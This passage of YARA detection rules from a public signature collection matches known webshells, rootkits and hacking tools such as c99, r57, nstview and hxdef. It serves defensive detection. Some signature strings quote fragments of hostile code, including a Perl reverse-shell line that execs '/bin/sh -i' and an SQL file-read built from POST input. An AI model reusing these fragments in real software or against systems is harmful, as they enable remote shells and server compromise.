		description = "Webshells Auto-generated - file r57.php"
		author = "Florian Roth (Nextron Systems)"
		id = "14092413-27a4-5b7d-9023-0b53b3d45a12"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7892-L7903"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "903908b77a266b855262cdbce81c3f72"
		logic_hash = "8d0f3b2009594d4aa413c4794dca12e3c66a19974cc6d0b47cc3f5e2572a4c57"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']."

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006X
{
	meta:
		description = "Webshells Auto-generated - file 2006X.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7904-L7916"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cf3ee0d869dd36e775dfcaa788db8e4b"
		logic_hash = "b71cf90900c7eae4caef57564292ca497a2c6c77e3de2994ba9e4cecae7f2697"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input name=\"password\" type=\"password\" id=\"password\""
		$s6 = "name=\"theAction\" type=\"text\" id=\"theAction\""

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phvayv_2
{
	meta:
		description = "Webshells Auto-generated - file phvayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "8bd52f9b-a232-566d-90ab-4085933cdc65"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7917-L7928"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "205ecda66c443083403efb1e5c7f7878"
		logic_hash = "11418a11692412ccb309983bdadd9bda2b27b692c3282eb0386094e76c7ba1e0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font"

	condition:
		all of them
}

rule SIGNATURE_BASE_Elmaliseker
{
	meta:
		description = "Webshells Auto-generated - file elmaliseker.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7ecf3d5c-be91-579e-905b-5f2ad03a0e42"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7929-L7941"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ccf48af0c8c09bbd038e610a49c9862e"
		logic_hash = "54c0b8e74a9b10fe54901c0595600af1dfc54abd3f710fc20ca87ca92236bb49"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "javascript:Command('Download'"
		$s5 = "zombie_array=array("

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Resolve
{
	meta:
		description = "Webshells Auto-generated - file resolve.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dcdb9952-63fc-57a7-ae17-ffe8ac4271f1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7942-L7959"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "69bf9aa296238610a0e05f99b5540297"
		logic_hash = "39d8ac274e94f13b5eb197be5827a95ac09df70793bd584c96b81983a565c1ce"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "3^n6B(Ed3"
		$s1 = "^uldn'Vt(x"
		$s2 = "\\= uPKfp"
		$s3 = "'r.axV<ad"
		$s4 = "p,modoi$=sr("
		$s5 = "DiamondC8S t"
		$s6 = "`lQ9fX<ZvJW"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remexp
{
	meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "48a262bf-7f48-5ed9-b043-80e9d563bf21"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7960-L7973"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b69670ecdbb40012c73686cd22696eeb"
		logic_hash = "b9b966a89ab097494d7af90775bf124f1310c77145be67fa57ebdacd0164e3d0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser"
		$s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F"
		$s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Tool
{
	meta:
		description = "Webshells Auto-generated - file tool.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "ed744aa4-7a35-57d6-89bd-3286a21b50a0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7974-L7985"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3a1e1e889fdd974a130a6a767b42655b"
		logic_hash = "a3449aca3124aa4d920d78e5e674ddd9d8a181b0ce0143032352a69dfdbcad2d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "\"\"%windir%\\\\calc.exe\"\")"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_2005
{
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "91d278d5-e9ec-5a28-9a54-4549b4f0cd07"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7986-L7998"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "97f2552c2fafc0b2eb467ee29cc803c8"
		logic_hash = "4d04174b23c9057acf2618c01cd702eaaec2d3508a8c25dd87fdd320c076a3b1"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp"
		$s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">"

	condition:
		all of them
}

rule SIGNATURE_BASE_Byloader
{
	meta:
		description = "Webshells Auto-generated - file byloader.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "24940e4b-06eb-548d-9e14-1a8f9c864bd3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7999-L8014"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0f0d6dc26055653f5844ded906ce52df"
		logic_hash = "66c900e4bc771fb23d7623e57ad51edaa95696c2e31554720582f3e33a1b2e25"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtfsChk"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "NTFS Disk Driver Checking Service"
		$s3 = "Dumping Description to Registry..."
		$s4 = "Opening Service .... Failure !"

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Fport
{
	meta:
		description = "Webshells Auto-generated - file Fport.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "664e7b19-4d0b-5062-97d2-0eb34869024d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8015-L8027"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "dbb75488aa2fa22ba6950aead1ef30d5"
		logic_hash = "b9dc66e249c0577839cc3748f129c343d2ccb7327b92a2a67e4467782d10a25e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "Copyright 2000 by Foundstone, Inc."
		$s5 = "You must have administrator privileges to run fport - exiting..."

	condition:
		all of them
}

rule SIGNATURE_BASE_Backdoor__Fr_
{
	meta:
		description = "Webshells Auto-generated - file BackDooR (fr).php"
		author = "Florian Roth (Nextron Systems)"
		id = "fd0c77e8-18b7-5eb4-8ed4-87ee4c864683"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8028-L8039"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a79cac2cf86e073a832aaf29a664f4be"
		logic_hash = "6c16c200712015eed71aeb119e46bad5f93445a8f719d98ef31f9012cb3551ae"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include "

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Ntdaddy
{
	meta:
		description = "Webshells Auto-generated - file ntdaddy.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "b6b655b8-7bce-5fa5-97b7-a020a7e53f4f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8040-L8051"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f6262f3ad9f73b8d3e7d9ea5ec07a357"
		logic_hash = "4df6f53ee9bfc0214e69dd858878026e962b90573ed48a5ffdd5523538e8f3bf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s"

	condition:
		all of them
}

rule SIGNATURE_BASE_Nstview_Nstview
{
	meta:
		description = "Webshells Auto-generated - file nstview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "00df601c-bddb-5da8-bef4-d2122419b5d0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8052-L8063"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3871888a0c1ac4270104918231029a56"
		logic_hash = "2b25e22d86a672af0b8957f1b0336ed80e09f3389f5045c230af2372db0e3415"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Upload
{
	meta:
		description = "Webshells Auto-generated - file upload.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "43054993-b0dd-5d2e-9890-db1f47759be5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8064-L8075"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b09852bda534627949f0259828c967de"
		logic_hash = "312020a72a37adb0111ac6d61810c8e476be39dc6456e80e83cd6a680e8ea051"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageUpload Below -->"

	condition:
		all of them
}

rule SIGNATURE_BASE_Passwordreminder
{
	meta:
		description = "Webshells Auto-generated - file PasswordReminder.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "642033ee-4454-5913-8348-4d1579fc0bd8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8076-L8087"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ea49d754dc609e8bfa4c0f95d14ef9bf"
		logic_hash = "f3da5381f5e352c541654d2af918ca8cea8049d137078670dd0538a4d13f676e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "The encoded password is found at 0x%8.8lx and has a length of %d."

	condition:
		all of them
}

rule SIGNATURE_BASE_Pack_Injectt
{
	meta:
		description = "Webshells Auto-generated - file InjectT.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3a640c22-0cd4-5ab1-9216-c68625d7d505"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8088-L8103"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "983b74ccd57f6195a0584cdfb27d55e8"
		logic_hash = "9f66b7b429ed585888c0fb4943bb12262247b3af8d85bc67309b27752171e66a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "ail To Open Registry"
		$s4 = "32fDssignim"
		$s5 = "vide Internet S"
		$s6 = "d]Software\\M"
		$s7 = "TInject.Dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remexp_2
{
	meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "501544d5-fe52-5933-8782-516ffe18f3ff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8104-L8116"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b69670ecdbb40012c73686cd22696eeb"
		logic_hash = "e31e25a7c2b2e970a379a61d2dac335bd37cac48328eee9f3966ff5c77ef6f18"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = " Then Response.Write \""
		$s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_C99
{
	meta:
		description = "Webshells Auto-generated - file c99.php"
		author = "Florian Roth (Nextron Systems)"
		id = "0b176370-a5ab-587a-b0e9-ef4fe5c604bd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8117-L8128"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5f9ba02eb081bba2b2434c603af454d0"
		logic_hash = "de769299bbd8b895b84db757fcc037b807f7caaa624c06e9d330934a968b2381"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rknt_Zip_Folder_Rknt
{
	meta:
		description = "Webshells Auto-generated - file RkNT.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "a58a3b33-8096-535a-b930-2eb71347edb8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8129-L8146"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5f97386dfde148942b7584aeb6512b85"
		logic_hash = "59de8a40a7081ee5fbea9f413590237c1da9985f2352b32571529baf38c93ddb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "PathStripPathA"
		$s1 = "`cLGet!Addr%"
		$s2 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s3 = "oQToOemBuff* <="
		$s4 = "ionCdunAsw[Us'"
		$s6 = "CreateProcessW: %S"
		$s7 = "ImageDirectoryEntryToData"

	condition:
		all of them
}

rule SIGNATURE_BASE_Dbgntboot
{
	meta:
		description = "Webshells Auto-generated - file dbgntboot.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "6b9381e6-597d-5e74-a318-9931d20a9d08"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8147-L8159"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4d87543d4d7f73c1529c9f8066b475ab"
		logic_hash = "10f86f18aff4995928efb3c8000eca166fe37e6006de7938139cad718ff7653f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp"
		$s3 = "sth junk the M$ Wind0wZ retur"

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Shell
{
	meta:
		description = "Webshells Auto-generated - file shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "08dff4db-3b1c-5702-a8c9-efaedf83c4ff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8160-L8172"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "45e8a00567f8a34ab1cccc86b4bc74b9"
		logic_hash = "a62061b2fa851f5798158198e26f188408f3f37dca69a85ca155777c0b8407ee"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz"
		$s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hxdef100
{
	meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "fb376c18-02d2-5866-a0e2-ccb5262091dd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8173-L8186"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "55cc1769cef44910bd91b7b73dee1f6c"
		logic_hash = "a2002dcddad7ffdbe9614723163016f9357347bb704640d3933ce4513c37d474"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RtlAnsiStringToUnicodeString"
		$s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
		$s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rdrbs100
{
	meta:
		description = "Webshells Auto-generated - file rdrbs100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "369e5ce0-984c-54eb-96d4-fbfb4f932ba6"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8187-L8199"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7c752bcd6da796d80a6830c61a632bff"
		logic_hash = "8a427ef9e0ecd0c810913203aaef43647964f33658dfdca8195fce6f0545f8f4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "Server address must be IP in A.B.C.D format."
		$s4 = " mapped ports in the list. Currently "

	condition:
		all of them
}

rule SIGNATURE_BASE_Mithril_Mithril
{
	meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "81645f57-7d7e-5b4d-b323-744f2cde4916"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8200-L8218"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "017191562d72ab0ca551eb89256650bd"
		logic_hash = "5d19eb4132a0401d226c9cffc927b2838e9c69428746296b55a488d097759587"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "OpenProcess error!"
		$s1 = "WriteProcessMemory error!"
		$s4 = "GetProcAddress error!"
		$s5 = "HHt`HHt\\"
		$s6 = "Cmaudi0"
		$s7 = "CreateRemoteThread error!"
		$s8 = "Kernel32"
		$s9 = "VirtualAllocEx error!"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hxdef100_2
{
	meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "1f079b73-29de-50cf-868c-1639a43e576f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8219-L8232"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1b393e2e13b9c57fb501b7cd7ad96b25"
		logic_hash = "d44131f6c1bfdc36079f474832a79a361dfad96d1b84f7004d682150c93eccc5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\\\.\\mailslot\\hxdef-rkc000"
		$s2 = "Shared Components\\On Access Scanner\\BehaviourBlo"
		$s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"

	condition:
		all of them
}

rule SIGNATURE_BASE_Release_Dlltest
{
	meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "af821252-8409-5572-9014-59e8c5feaacd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8233-L8253"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "76a59fc3242a2819307bb9d593bef2e0"
		logic_hash = "ba759ae1bbde357085b2b2dfda0780b5a239a44b4e999244e8eceed246090ce3"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = ";;;Y;`;d;h;l;p;t;x;|;"
		$s1 = "0 0&00060K0R0X0f0l0q0w0"
		$s2 = ": :$:(:,:0:4:8:D:`=d="
		$s3 = "4@5P5T5\\5T7\\7d7l7t7|7"
		$s4 = "1,121>1C1K1Q1X1^1e1k1s1y1"
		$s5 = "9 9$9(9,9P9X9\\9`9d9h9l9p9t9x9|9"
		$s6 = "0)0O0\\0a0o0\"1E1P1q1"
		$s7 = "<.<I<d<h<l<p<t<x<|<"
		$s8 = "3&31383>3F3Q3X3`3f3w3|3"
		$s9 = "8@;D;H;L;P;T;X;\\;a;9=W=z="

	condition:
		all of them
}

rule SIGNATURE_BASE_Webadmin
{
	meta:
		description = "Webshells Auto-generated - file webadmin.php"
		author = "Florian Roth (Nextron Systems)"
		id = "615d87f8-9094-5994-aea1-d7276623fbca"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8254-L8265"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3a90de401b30e5b590362ba2dde30937"
		logic_hash = "6e215c3d8b8357b839416ee6951f7739387bb94aa1284ea7e827ae2205221294"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu"

	condition:
		all of them
}

rule SIGNATURE_BASE_Commands
{
	meta:
		description = "Webshells Auto-generated - file commands.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7cffefc7-4f24-5908-82a4-f11eda398377"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8266-L8278"
